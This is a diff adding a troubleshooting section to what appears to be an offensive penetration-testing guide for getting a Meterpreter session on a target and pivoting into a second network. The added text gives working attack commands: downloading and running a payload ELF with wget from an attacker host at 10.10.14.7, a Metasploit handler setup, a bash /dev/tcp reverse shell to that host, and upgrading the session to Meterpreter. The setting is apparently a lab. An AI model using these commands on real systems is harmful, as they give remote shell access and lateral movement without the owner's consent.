@@ -27,6 +27,48 @@ Get `shell.elf` onto the target, then:
 chmod +x shell.elf && ./shell.elf      # -> you get: meterpreter >
 ```
 
+## 3b. If the ELF segfaults (`Segmentation fault (core dumped)`)
+
+Two causes: the file got corrupted in transfer, or the ELF is incompatible with the host.
+
+**First, verify the file on the target:**
+
+```bash
+file shell.elf      # must say: ELF 64-bit LSB ... x86-64
+wc -c shell.elf     # byte count must MATCH the copy on your attacker box
+```
+
+If it's mangled or the size differs, re-transfer in binary (never copy-paste a binary):
+
+```bash
+# attacker:
+python3 -m http.server 80
+# target:
+wget http://10.10.14.7/shell.elf && chmod +x shell.elf && ./shell.elf
+```
+
+**If the file is intact and still crashes, skip the ELF** — get a native bash shell and let msf upgrade it to meterpreter (what the pivot needs anyway):
+
+```text
+# in msf — catch a raw shell:
+use exploit/multi/handler
+set payload generic/shell_reverse_tcp
+set LHOST 10.10.14.7
+set LPORT 4444
+run
+```
+
+```bash
+# on the target — native, no ELF:
+bash -i >& /dev/tcp/10.10.14.7/4444 0>&1
+```
+
+```text
+# back in msf, once the shell lands:
+# press Ctrl+Z to background the shell session, then:
+sessions -u 1       # upgrade session 1 -> meterpreter (for autoroute/socks below)
+```
+
 ## 4. Pivot into the second network
 
 Example: the box also touches `10.10.20.0/24`.
